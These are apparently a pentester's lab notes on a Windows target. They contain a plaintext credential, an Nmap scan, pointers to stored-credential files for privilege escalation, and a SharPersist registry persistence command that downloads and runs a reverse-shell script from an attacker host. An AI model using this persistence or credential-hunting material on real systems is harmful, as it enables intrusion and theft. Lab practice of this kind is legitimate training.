## Notes

Jeff:Mathsisfun123

## Nmap

```
# Nmap 7.98 scan initiated Fri Jan 23 13:05:10 2026 as: nmap -p22,7680,80 -sV -sC -iL target.txt -oN targeted
Nmap scan report for 192.168.133.200
Host is up (0.035s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 21:76:63:1c:3b:10:a6:a7:73:d6:e7:dd:1e:a2:b6:83 (RSA)
|   256 62:a8:39:f6:ab:92:cd:26:03:bf:1e:28:25:4e:8e:7a (ECDSA)
|_  256 02:39:7c:e2:af:6a:44:98:ec:9a:28:98:a0:8b:fe:c4 (ED25519)
80/tcp   open  http       PHP cli server 5.5 or later (PHP 7.3.33)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was login.php
7680/tcp open  pando-pub?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 23 13:05:59 2026 -- 1 IP address (1 host up) scanned in 49.24 seconds
```

## 80

sqli

cre

## Privesc

https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\Jeff\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt

C:\php\RunHiddenConsole.exe

## Persistence

.\sharpersist.exe -t reg -c "C:\windows\System32\WindowsPowershell\v1.0\powershell.exe" -a "-command IEX(New-Object Net.Webclient).downloadString('http://192.168.
45.160:8000/rev.ps1')" -k logonscript -n "bigfish_reglogon" -m add
